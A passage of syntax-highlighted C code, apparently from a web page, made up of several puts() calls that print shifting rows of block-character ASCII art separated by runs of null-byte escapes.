style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ 